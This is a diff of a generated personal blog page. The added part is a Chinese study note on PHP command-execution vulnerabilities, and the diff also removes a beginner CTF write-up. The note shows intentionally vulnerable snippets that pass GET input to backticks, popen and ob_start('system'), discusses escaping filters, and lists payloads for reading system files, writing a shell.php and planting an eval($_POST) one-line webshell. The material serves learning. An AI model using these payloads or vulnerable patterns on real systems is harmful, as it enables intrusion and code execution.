+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;id&#x27;];</span><br><span class="line">echo `$a`;</span><br></pre></td></tr></table></figure>
+
+<p>在php中&#96;是一个执行运算符，会将他当作shell命令执行</p>
+<p><strong>5.ob_star()</strong></p>
+<p>ob_start — 打开输出控制缓冲</p>
+<p>ob_star 函数只能接受字符串参数，该函数有返回值，当请求结束后被调用，也可以手动 ob_flush(),ob_clean()或ob_end_flush冲刷（送出）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start(&quot;system&quot;);</span><br><span class="line">echo &quot;whoami&quot;;</span><br><span class="line">6.popen()</span><br><span class="line">&lt;?php</span><br><span class="line">$command=$_GET[&#x27;id&#x27;];</span><br><span class="line">$handle = popen($command, &quot;r&quot;);</span><br><span class="line">if (is_resource($handle))&#123;</span><br><span class="line">    while (!feof($handle)) &#123;</span><br><span class="line">        echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">        echo fread($handle, 1024);</span><br><span class="line">        echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">pclose($handle);</span><br></pre></td></tr></table></figure>
+
+<p><strong>7.proc_open</strong><br>执行一个命令，并且打开 用来输入输出文件的指针</p>
+<h5 id="四，过滤函数"><a href="#四，过滤函数" class="headerlink" title="四，过滤函数"></a>四，过滤函数</h5><p>escapeshellcmd()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=&quot;GBK&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$cmd = escapeshellcmd($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">echo &quot;&lt;pre &gt;&quot;;</span><br><span class="line">echo $cmd;</span><br><span class="line">//echo exec($cmd);</span><br><span class="line">shell_exec($cmd);</span><br><span class="line"></span><br><span class="line">//escapeshellarg();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>它过滤了一些特殊字符，以至于命令无法执行：</p>
+<p>![](D:\My Blog\source_posts\PHP命令执行漏洞.assets\2020112714481253.png)</p>
+<p>escapeshellarg()</p>
+<p>这个函数是将参数转化为字符串，也就是将我们的命令转化为字符串，起到一个保护作用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=&quot;GBK&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$cmd = escapeshellarg($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">echo &quot;&lt;pre &gt;&quot;;</span><br><span class="line">echo $cmd.&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">//echo exec($cmd);</span><br><span class="line">echo shell_exec($cmd);</span><br><span class="line"></span><br><span class="line">//escapeshellarg();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>![在这里插入图片描述](D:\My Blog\source_posts\PHP命令执行漏洞.assets\20201127145319201.png)</p>
+<h4 id="命令执行漏洞的利用方式"><a href="#命令执行漏洞的利用方式" class="headerlink" title="命令执行漏洞的利用方式"></a>命令执行漏洞的利用方式</h4><p>查看文件：?a&#x3D;type +文件路径</p>
+<p>查看当前绝对地址：?a&#x3D;cd</p>
+<p>写shell:?a&#x3D;echo”<?php.phpinfo();?>D-</p>
+<h4 id="远程命令函数的利用"><a href="#远程命令函数的利用" class="headerlink" title="远程命令函数的利用"></a>远程命令函数的利用</h4><p>&gt;?a&#x3D;@eval($_POST[666]);</p>
+<p>一句话木马</p>
+<p>&gt;?a&#x3D;print(<strong>FILE</strong>);</p>
+<p>获取当前绝对路径</p>
+<p>&gt;?a&#x3D;var_dump(file_get_contents(‘c:\windows\system32\drivers\etc\hosts’));</p>
+<p>读取文件</p>
+<p>&gt;?a&#x3D;var_dump(file_put_contents($_POST[1],$_POST[2]));</p>
+<p>1&#x3D;shell.php&amp;2&#x3D;<?php phpinfo()?></p>
+<p>写shell</p>
 
       
     </div>
@@ -1289,78 +1654,12 @@
 
 
   
-    <article id="post-第一周作业wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/01/19/%E7%AC%AC%E4%B8%80%E5%91%A8%E4%BD%9C%E4%B8%9Awp/" class="article-date">
-  <time class="dt-published" datetime="2023-01-19T14:04:29.000Z" itemprop="datePublished">2023-01-19</time>
-</a>
+
+
+  <nav id="page-nav">
     
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/01/19/%E7%AC%AC%E4%B8%80%E5%91%A8%E4%BD%9C%E4%B8%9Awp/">第一周作业wp</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>题目1：简单的html<br>文件：web基础.html<br>题目描述：我把flag拆开藏在这个文件里面了你能找到完整的flag吗<br>flag格式：flag{xxxxxxxxxxx}<br>题目2：2048<br>文件：2048.html、2048.css、2048.html(注：双击2048.html打开)<br>题目描述：这是一个经典的游戏，由js实现，如果你能玩的超过20000分，游戏结束后就会给你flag，目标有点高，千万别因为打不够20001分而对着js大喊fuck哦<br>flag格式：flag{xxxxxxxxxxx}<br>题目3(选做)：挑战以多种解法拿到题目2的flag</p>
-<h2 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h2><p>  通过题目描述可知，flag应该是包含在“web基础.html”中，双击打开发现是一个网页，那必然是查看网页源代码，直接右键，然后点击</p>
-<p><img src="https://raw.githubusercontent.com/Hfjxfw/Hfjxfw/main/imgscapture_20230119221340421.bmp" alt="capture_20230119221340421"></p>
-<p>   “查看网页源代码”，或者按F12。</p>
-<p><img src="https://raw.githubusercontent.com/Hfjxfw/Hfjxfw/main/imgscapture_20230119221736363.bmp" alt="capture_20230119221736363"></p>
-<p>看到flag被隐藏起来不会出现在网页上，只用把&lt;!–……&gt;替换为<p>……</p>即可，flag只有一半，用vs将网页打开，启用查找功能，接着能发现flag的另一半，然后xv组成完整的flag，再次打开网页。<img src="https://raw.githubusercontent.com/Hfjxfw/Hfjxfw/main/202301251711428.bmp" alt="capture_20230124224707242"></p>
-<h2 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h2><p>通过题目描述，题目二是通过一个小游戏获取分数，从而得到flag，但是分数过于离谱，就不往玩游戏方面考虑。看到“2048.html网页，打开，查看源码</p>
-<p><img src="https://raw.githubusercontent.com/Hfjxfw/Hfjxfw/main/imgscapture_20230119222942898.bmp" alt="capture_20230119222942898"></p>
-<p><img src="https://raw.githubusercontent.com/Hfjxfw/Hfjxfw/main/imgscapture_20230119223000542.bmp" alt="capture_20230119223000542"></p>
-<p>发现该网页有两个题目文件夹中文件的链接，单击无法打开，接着就用vs打开这两个文件。</p>
-<p>2048.css中<img src="https://raw.githubusercontent.com/Hfjxfw/Hfjxfw/main/imgscapture_20230119223506043.bmp" alt="capture_20230119223506043">是一些长宽参数和颜色参数，与题目无关。</p>
-<p>接着打开2048.js</p>
-<p><img src="https://raw.githubusercontent.com/Hfjxfw/Hfjxfw/main/imgscapture_20230119223837261.bmp" alt="capture_20230119223837261"></p>
-<p>可以看出其中是有关游戏的规则的代码，我们就通过可以修改代码来快速获得flag。</p>
-<p><img src="https://raw.githubusercontent.com/Hfjxfw/Hfjxfw/main/imgscapture_20230119224046286.bmp" alt="capture_20230119224046286"></p>
-<p>代码审计后可以看出，当游戏结束时，若分数大于20000，可以获得alert函数运行的弹窗，后面的内容应该就是flag，方法如下：</p>
-<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>在代码开始时对分数（this.score）进行了定义和赋值，就可以将this.score &#x3D;0改为this.score &#x3D;2000000,保存，再次打开2048.html</p>
-<p><img src="https://raw.githubusercontent.com/Hfjxfw/Hfjxfw/main/imgscapture_20230119225928729.bmp" alt="capture_20230119225928729"></p>
-<p>然后打开2048.htlm</p>
-<p><img src="https://raw.githubusercontent.com/Hfjxfw/Hfjxfw/main/imgscapture_20230119230100891.bmp" alt="capture_20230119230100891"></p>
-<p><strong>可以看到分数变成200000000，这个时候就随便玩，输了就会显示flag</strong></p>
-<p><img src="https://raw.githubusercontent.com/Hfjxfw/Hfjxfw/main/imgscapture_20230119230301451.bmp" alt="capture_20230119230301451"><img src="https://raw.githubusercontent.com/Hfjxfw/Hfjxfw/main/202301251714890.bmp" alt="capture_20230124224928502"></p>
-<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>我们就直接修改flag弹出的条件</p>
-<p><img src="https://raw.githubusercontent.com/Hfjxfw/Hfjxfw/main/imgscapture_20230119231844586.bmp" alt="capture_20230119231844586"></p>
-<p>这个大于小于或者直接把条件语句删了，再或者直接改它的数字都可以，最后也可以得到flag。</p>
-<p><strong>但是呢我们玩游戏输很难啊，我们要敲那个键盘很累，那很容易把我们累死，所以呢我们再修改一下游戏结束的条件</strong></p>
-<p><img src="https://raw.githubusercontent.com/Hfjxfw/Hfjxfw/main/imgscapture_20230119232456620.bmp" alt="capture_20230119232456620"></p>
-<p><strong>就把嵌套的if语句全删了，或者修改第一个if的条件，简单粗暴的就自己写一个条件语句，例如：</strong>if(this.score&#x3D;4)</p>
-<p><img src="https://raw.githubusercontent.com/Hfjxfw/Hfjxfw/main/imgscapture_20230119232939824.bmp" alt="capture_20230119232939824"></p>
-<p><strong>然后只用敲一下就出flag，非常的方便，保证了我们的生命安全。</strong><em><strong><u>当然上面的方法可以配合使用</u></strong></em></p>
-<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>把alert后面的运算符放到编译器里面跑一下应该可以</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>第一周的第一次作业重要就是学习了如何查看网页源代码以及代码审计的入门，要了解html和js的基本含义以及用法，可以说还是比较基础，后面可能会逐渐变难,不过要坚持走下去。</strong></p>
-<p><em>The road is long and the obstacles are long</em></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/01/19/%E7%AC%AC%E4%B8%80%E5%91%A8%E4%BD%9C%E4%B8%9Awp/" data-id="clde60eig0000go849mk5ctkz" data-title="第一周作业wp" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+  </nav>
 
 </section>
         
@@ -1391,23 +1690,23 @@
       <ul>
         
           <li>
+            <a href="/2023/02/05/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">一句话木马与文件上传</a>
+          </li>
+        
+          <li>
+            <a href="/2023/02/05/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/">图片隐写</a>
+          </li>
+        
+          <li>
+            <a href="/2023/02/05/crc%E6%A0%A1%E9%AA%8C%E4%B8%8E%E5%8E%8B%E7%BC%A9%E5%8C%85/">crc校验与压缩包</a>
+          </li>
+        
+          <li>
             <a href="/2023/02/05/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">PHP命令执行漏洞</a>
           </li>
         
           <li>
             <a href="/2023/01/27/%E7%AC%AC%E4%B8%80%E6%AC%A1misc%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2023/01/27/%E7%AC%AC%E4%BA%8C%E5%91%A8web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/">第二周web学习笔记</a>
-          </li>
-        
-          <li>
-            <a href="/2023/01/27/php%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2023/01/27/js%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0/">(no title)</a>
           </li>
         
       </ul>
